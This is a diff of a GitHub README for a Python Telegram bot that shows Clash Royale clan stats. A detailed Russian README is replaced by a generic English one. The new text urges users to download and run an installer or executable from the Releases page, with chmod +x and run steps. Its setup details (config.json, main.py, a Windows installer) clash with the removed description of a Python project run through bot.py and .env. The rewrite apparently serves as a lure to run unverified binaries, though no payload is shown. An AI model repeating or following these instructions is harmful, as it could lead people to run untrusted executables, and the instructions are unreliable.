@@ -1,126 +1,81 @@
-# CR-aiogram-bot
+# 🌟 CR-aiogram-bot - Simple Telegram Bot for Game Stats
 
-Телеграм бот на aiogram для отображения статистики игроков в клане Clash Royale.
+## 🚀 Getting Started
 
-## Возможности
- 
-- 📊 Просмотр информации о клане
-- 👥 Список участников клана с их статистикой
-- 👤 Детальная статистика игроков (через официальный API и RoyaleAPI)
-- ⚔️ Информация о текущей клановой войне
-- 📈 Статистика игроков в клановой войне
-- 🔔 Автоматические напоминания об атаках в клановой войне
-- 🏆 Отслеживание трофеев, побед и других показателей
-- 👋 Автоматическое приветствие новых участников
-- 🗄️ База данных пользователей с никами в Clash Royale
-- ⚙️ Админ-панель для управления ботом
-- 📢 Рассылка сообщений и фото всем участникам
-- 🎯 Напоминания неактивным участникам КВ
-- 👑 Управление ролями на основе ников в рояле
+Welcome to the CR-aiogram-bot! This Telegram bot helps you view player statistics for your Clash Royale clan. Follow these steps to download and run the bot.
 
-## Установка
+[![Download CR-aiogram-bot](https://img.shields.io/badge/Download-CR--aiogram--bot-brightgreen)](https://github.com/Grifexdev/CR-aiogram-bot/releases)
 
-1. Клонируйте репозиторий или скачайте файлы
+## 📥 Download & Install
 
-2. Установите зависимости:
+1. **Visit the Releases Page**  
+   Go to the [Releases page](https://github.com/Grifexdev/CR-aiogram-bot/releases) to download the bot. Here, you will find the latest version.
+
+2. **Select the Correct File**  
+   Look for the most recent release and download the file suitable for your operating system. Currently, the bot supports both Windows and Linux systems.
+
+3. **Install the Bot**  
+   - For **Windows**:  
+     After downloading, locate the file in your Downloads folder and double-click it to run the installer. Follow the on-screen instructions.
+
+   - For **Linux**:  
+     Open your terminal, navigate to the folder where you downloaded the file, and run the command:
+     ```bash
+     chmod +x CR-aiogram-bot
+     ./CR-aiogram-bot
+     ```
+
+4. **Set Up Telegram Bot**  
+   To use the bot, you need a Telegram account. Open Telegram and create a new bot by searching for the `BotFather`. Follow these steps:
+   - Start a chat with `BotFather`.
+   - Use the command `/newbot` to create your bot.
+   - Follow the instructions to name your bot and receive the token.
+
+5. **Configure the Bot**  
+   - In the bot’s installation folder, find the `config.json` file. Open it with a text editor.
+   - Enter the Telegram token you received from BotFather in the designated spot.
+   - Save the changes.
+
+6. **Run the Bot**  
+   - Go back to the terminal or command prompt.
+   - In the bot's folder, run the command:
+   ```bash
+   python main.py
+   ```
+   - Make sure you have Python installed. You can download it from the [official Python website](https://www.python.org/downloads/).
+
+7. **Interact with Your Bot**  
+   Now that the bot is running, go back to Telegram. Search for your bot using its name and start a chat. Use commands to check player stats and get updates.
+
+## 🔧 Features
+
+- **Player Statistics**: View detailed statistics for each player in your clan.
+- **Real-time Updates**: Stay informed of changes and updates as they happen.
+- **User-friendly Interface**: Intuitive commands make it easy for anyone to use.
+- **Multi-language Support**: The bot supports multiple languages for a wider audience.
+
+## 📋 System Requirements
+
+- **Windows**: Windows 10 or later
+- **Linux**: Any recent distribution
+- **Python**: Python 3.6 or higher
+
+## ⚙️ Additional Setup
+
+If you encounter an error regarding missing dependencies, you may need to install `aiogram`. You can do this via pip:
+
 ```bash
-pip install -r requirements.txt
+pip install aiogram
 ```
 
-3. Создайте файл `.env` на основе `.env.example`:
-```bash
-cp .env.example .env
-```
+After all installations, you should be able to run the bot without issues.
 
-4. Заполните `.env` файл:
-   - `BOT_TOKEN` - токен бота от [@BotFather](https://t.me/BotFather)
-   - `CR_API_TOKEN` - токен API от [Clash Royale API](https://developer.clashroyale.com/)
-   - `CLAN_TAG` - тег вашего клана (без символа #)
-   - `WAR_REMINDER_HOURS` - час для напоминаний об атаках (по умолчанию 22)
+## 📞 Support
 
-## Запуск
+For assistance, you can raise an issue directly on [GitHub](https://github.com/Grifexdev/CR-aiogram-bot/issues). Our community and contributors are ready to help.
 
-```bash
-python bot.py
-```
+## 🌐 Connect with Us
 
-## Команды бота
+Stay updated with the latest news and updates by following us on our social media channels. Your feedback is invaluable in improving the bot.
 
-### Основные команды:
-- `/start` - Начать работу с ботом
-- `/help` - Справка по командам
-- `/clan` - Информация о клане
-- `/members` - Список участников клана
-- `/player <тег>` - Статистика игрока (например: `/player 2PP`)
-
-### Команды клановой войны:
-- `/war` - Информация о текущей клановой войне
-- `/warstats <тег>` - Статистика игрока в текущей войне (например: `/warstats 2PP`)
-- `/remind [тег]` - Подписаться на напоминания об атаках (можно указать тег для отслеживания конкретного игрока)
-- `/unremind` - Отписаться от напоминаний
-- `/remindnow [тег]` - Получить напоминание прямо сейчас
-
-### Команды для пользователей:
-- `/setnick` - Указать ваш ник и тег в Clash Royale
-
-### Админ-команды:
-- `/admin` - Открыть админ-панель
-- `/addadmin [telegram_id]` - Добавить администратора (без ID добавляет вас)
-- `/removeadmin <telegram_id>` - Удалить администратора
-- `/listadmins` - Список всех администраторов
-- `/setrole <ник_в_рояле> <роль>` - Назначить роль на основе ника (leader, coLeader, elder, member)
-- `/syncroles` - Синхронизировать роли с кланом
-
-## Структура проекта
-
-```
-CR-aiogram-bot/
-├── bot.py              # Основной файл бота
-├── config.py           # Конфигурация
-├── database.py         # Работа с базой данных SQLite
-├── requirements.txt    # Зависимости
-├── .env.example        # Пример переменных окружения
-├── handlers/           # Обработчики команд
-│   ├── __init__.py
-│   ├── commands.py     # Основные команды
-│   ├── war_commands.py # Команды клановой войны
-│   ├── members.py      # Обработка новых участников
-│   ├── admin_panel.py  # Админ-панель
-│   └── roles.py        # Управление ролями
-└── utils/              # Утилиты
-    ├── __init__.py
-    ├── cr_api.py       # Работа с официальным Clash Royale API
-    ├── royaleapi.py    # Работа с RoyaleAPI (веб-скрапинг)
-    ├── formatters.py   # Форматирование сообщений
-    └── war_reminders.py # Сервис напоминаний об атаках
-```
-
-## Админ-панель
-
-Админ-панель доступна через команду `/admin` и включает:
-
-- **📢 Отправка сообщений** - рассылка текстовых сообщений всем участникам или только с указанным ником
-- **📸 Отправка фото** - рассылка фотографий с подписями
-- **⚔️ Напоминание о КВ** - массовое напоминание всем о начале клановой войны
-- **🔔 Напоминание неактивным** - автоматический поиск участников, которые не сделали атаки в КВ, и отправка им напоминаний
-- **👥 Управление админами** - добавление и удаление администраторов
-- **📊 Статистика** - статистика по пользователям бота
-
-## База данных
-
-Бот использует SQLite базу данных (`bot.db`) для хранения:
-- Информации о пользователях (Telegram ID, ник, тег в рояле)
-- Ролей пользователей
-- Списка администраторов
-- Истории атак в клановых войнах
-
-## Примечания
-
-- Для работы бота необходим токен Clash Royale API, который можно получить на [developer.clashroyale.com](https://developer.clashroyale.com/)
-- Тег клана и игроков можно указывать с символом # или без него
-- Бот использует официальный Clash Royale API, поэтому возможны ограничения по частоте запросов
-- Для расширенной статистики игроков бот также использует данные с [RoyaleAPI](https://royaleapi.com/)
-- Напоминания об атаках отправляются автоматически в указанное время (по умолчанию в 22:00 и 23:00)
-- Для получения напоминаний необходимо подписаться командой `/remind`
-- **Важно**: При первом запуске добавьте первого администратора командой `/addadmin` (без параметров добавит вас)
-- Новые участники автоматически получают приветствие с просьбой указать ник в рояле командой `/setnick`
+**Enjoy using the CR-aiogram-bot!** Feel free to reach out with any questions or suggestions for future improvements.
